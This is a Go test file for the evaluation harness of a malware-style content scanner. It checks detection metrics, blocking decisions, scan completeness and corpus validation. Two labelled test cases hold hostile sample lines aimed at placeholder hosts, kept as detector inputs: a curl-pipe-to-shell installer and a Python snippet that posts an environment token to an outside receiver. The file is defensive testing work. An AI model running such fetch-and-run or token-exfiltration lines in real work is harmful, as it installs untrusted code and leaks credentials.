package evaluation_test

import (
	"context"
	"encoding/json"
	"slices"
	"strings"
	"testing"

	"github.com/skarm/scout"
	"github.com/skarm/scout/fetch"
	"github.com/skarm/scout/internal/dev/evaluation"
	"github.com/skarm/scout/internal/signatures"
	"github.com/skarm/scout/internal/syntax/frontend"
)

func TestMeasureUsesReaderRunsAndIndependentPolicy(t *testing.T) {
	scanner := newScanner(t, offlineOptions())
	data := corpusBytes(t,
		evaluation.Case{
			ID:       "signal",
			Category: "shell",
			Label:    "signal",
			Path:     "install.txt",
			Content:  "curl https://example.invalid/unique-secret-installer | sh",
		},
		evaluation.Case{
			ID:       "benign",
			Category: "docs",
			Label:    "benign",
			Path:     "README.txt",
			Content:  "ordinary formatting instructions",
		},
		evaluation.Case{
			ID:       "gap",
			Category: "docs",
			Label:    "known_static_gap",
			Path:     "gap.txt",
			Content:  "ordinary formatting instructions",
		},
	)
	r, err := evaluation.Measure(context.Background(), scanner, data)
	if err != nil {
		t.Fatal(err)
	}
	if r.EngineVersion != scout.Version() || r.Inspection.Name != "custom" || len(r.Results) != 3 || r.Overall.DetectedPositive != 1 || r.Overall.CompleteNegativeBenign != 1 || r.Overall.MissedPositive != 1 || r.Overall.Incomplete != 0 {
		t.Fatalf("wrong corpus metrics: %+v", r)
	}
	if r.Results[0].Decision != "block" || r.Results[1].Decision != "allow" || len(r.Results[0].Rules) != 1 || r.Results[0].Rules[0] != "EX001" || r.Results[0].ScanFailed {
		t.Fatalf("policy or findings lost: %+v", r.Results)
	}
	encoded, err := json.Marshal(r)
	if err != nil || strings.Contains(string(encoded), "unique-secret-installer") {
		t.Fatalf("report contains source content: err=%v", err)
	}
}

func TestMeasureIncompleteOrClosedScannerCannotProduceSuccessfulNegative(t *testing.T) {
	o := offlineOptions()
	o.Limits.Capture.MaxFileBytes = 4
	scanner := newScanner(t, o)
	data := corpusBytes(t, evaluation.Case{
		ID:       "benign",
		Category: "docs",
		Label:    "benign",
		Path:     "README.txt",
		Content:  "longer than the capture allowance",
	})
	for _, closeFirst := range []bool{false, true} {
		if closeFirst {
			if err := scanner.Close(); err != nil {
				t.Fatal(err)
			}
		}
		r, err := evaluation.Measure(context.Background(), scanner, data)
		if err != nil || len(r.Results) != 1 {
			t.Fatalf("partial case should be retained: %+v %v", r, err)
		}
		if r.Overall.CompleteNegativeBenign != 0 || r.Overall.UnresolvedBenign != 1 || r.Overall.Incomplete != 1 || !r.Results[0].ScanFailed || r.Results[0].Decision == "allow" {
			t.Fatalf("unfinished scan was accepted: %+v", r)
		}
	}
}

func TestMeasureRejectsNetworkConfigurationBeforeScanning(t *testing.T) {
	o := offlineOptions()
	download := fetch.DefaultOptions()
	download.Enabled = true
	o.Download = &download
	scanner := newScanner(t, o)
	data := corpusBytes(t, evaluation.Case{
		ID:       "benign",
		Category: "docs",
		Label:    "benign",
		Path:     "README.txt",
		Content:  "plain text",
	})
	if _, err := evaluation.Measure(context.Background(), scanner, data); err == nil {
		t.Fatal("online scanner accepted for offline corpus")
	}
	if _, err := evaluation.Measure(nil, scanner, data); err == nil {
		t.Fatal("nil context accepted")
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := evaluation.Measure(ctx, newScanner(t, offlineOptions()), data); err == nil {
		t.Fatal("cancelled corpus context accepted")
	}
}

func TestMeasureStandardProfileWithNativeBackends(t *testing.T) {
	for _, name := range []string{"python", "yaml", "toml"} {
		if !frontend.BackendFor(name).Available {
			t.Skip("standard profile requires native parser capabilities")
		}
	}
	if !signatures.Backend().Available {
		t.Skip("standard profile requires native YARA-X")
	}
	scanner := newScanner(t, scout.DefaultOptions())
	data := corpusBytes(t,
		evaluation.Case{
			ID:       "python-flow",
			Category: "credentials",
			Label:    "signal",
			Path:     "sentinel.py",
			Content:  "import os\nimport requests\ntoken = os.getenv('SERVICE_TOKEN')\nrequests.post('https://receiver.invalid', data=token)\n",
		},
		evaluation.Case{
			ID:       "benign",
			Category: "docs",
			Label:    "benign",
			Path:     "README.txt",
			Content:  "ordinary formatting instructions",
		},
	)
	r, err := evaluation.Measure(context.Background(), scanner, data)
	if err != nil || r.Inspection.Name != "standard" || len(r.Results) != 2 || !slices.Contains(r.Results[0].Rules, "PY-TT3") || r.Results[0].Decision != "block" {
		t.Fatalf("native evaluation lost parser evidence or policy: %+v %v", r, err)
	}
	// Completing the selected subset is independent from its advisory limitations.
	if r.Overall.Incomplete != 0 || r.Results[0].ScanFailed || r.Results[0].Completeness != "complete" || r.Results[1].ScanFailed || r.Results[1].Decision != "allow" || r.Overall.CompleteNegativeBenign != 1 {
		t.Fatalf("native coverage completeness was misclassified: %+v", r)
	}
}

func TestKnownGapsAndIncompleteBenignAreNotSuccessfulNegatives(t *testing.T) {
	var m evaluation.Metrics
	evaluation.AddForTest(&m, evaluation.Result{Label: "known_static_gap", Completeness: "complete"})
	evaluation.AddForTest(&m, evaluation.Result{Label: "benign", Completeness: "partial"})
	evaluation.AddForTest(&m, evaluation.Result{Label: "signal", Completeness: "partial", Rules: []string{"R1"}})
	evaluation.AddForTest(&m, evaluation.Result{Label: "benign", Completeness: "complete", Rules: []string{"R1"}})
	evaluation.AddForTest(&m, evaluation.Result{Label: "ambiguous", Completeness: "complete", Rules: []string{"R1"}})
	evaluation.FinishForTest(&m)
	if m.MissedPositive != 1 || m.CompleteNegativeBenign != 0 || m.UnresolvedBenign != 1 || m.Incomplete != 2 || m.Ambiguous != 1 || m.DetectedPositive != 1 || m.FalsePositiveBenign != 1 {
		t.Fatal(m)
	}
	if m.SignalPrecision == nil || *m.SignalPrecision != 0.5 || m.SignalRecall == nil || *m.SignalRecall != 0.5 {
		t.Fatal(m)
	}
}

func TestCorpusValidationRejectsAmbiguousInputs(t *testing.T) {
	for _, data := range []string{
		`{"schema_version":1,"kind":"authored_regression_not_holdout","cases":[]}`,
		`{"schema_version":1,"kind":"authored_regression_not_holdout","cases":[{"id":"x","category":"test","label":"benign","path":"../escape","content":""}]}`,
		`{"schema_version":1,"kind":"authored_regression_not_holdout","cases":[{"id":"x","category":"test","label":"safe","path":"test.txt","content":""}]}`,
	} {
		if _, err := evaluation.Parse([]byte(data)); err == nil {
			t.Fatal("accepted invalid corpus", data)
		}
	}
}

func corpusBytes(t *testing.T, cases ...evaluation.Case) []byte {
	t.Helper()
	data, err := json.Marshal(evaluation.Corpus{SchemaVersion: 1, Kind: "authored_regression_not_holdout", Cases: cases})
	if err != nil {
		t.Fatal(err)
	}
	return data
}

func offlineOptions() scout.Options {
	o := scout.DefaultOptions()
	o.Profile, o.Checks = scout.Custom, &scout.Checks{}
	return o
}

func newScanner(t *testing.T, options scout.Options) *scout.Scanner {
	t.Helper()
	s, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := s.Close(); err != nil {
			t.Error(err)
		}
	})
	return s
}
